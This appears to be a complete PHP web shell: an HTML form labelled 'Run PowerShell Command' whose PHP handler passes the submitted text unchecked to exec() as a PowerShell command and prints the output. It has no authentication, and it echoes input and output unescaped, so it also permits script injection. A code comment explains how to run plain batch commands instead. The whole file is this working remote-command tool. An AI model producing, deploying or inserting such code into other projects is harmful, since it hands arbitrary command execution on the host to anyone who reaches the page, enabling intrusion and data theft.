<html>
  <body>
    <h1>Run PowerShell Command</h1>
    <form action="" method="post">
           <label>Enter a valid PowerShell Command <input type='text' name="cmd" required ></label>
          <button type="submit">Execute</button>
    </form>
  </body>
</html>

<?php
	
	if($_SERVER['REQUEST_METHOD'] == 'POST')
	{	
		$input = $_POST['cmd'];
		
		//remove 'PowerShell -Command ' if you want to execute windows batch commands.
		exec("PowerShell -Command $input", $output);
		$outputString = join("<br>", $output);
		
		echo "<hr>";
		echo "<h2>PS> $input</h2>";
		echo "<pre><code>$outputString</code></pre>";
	}
?>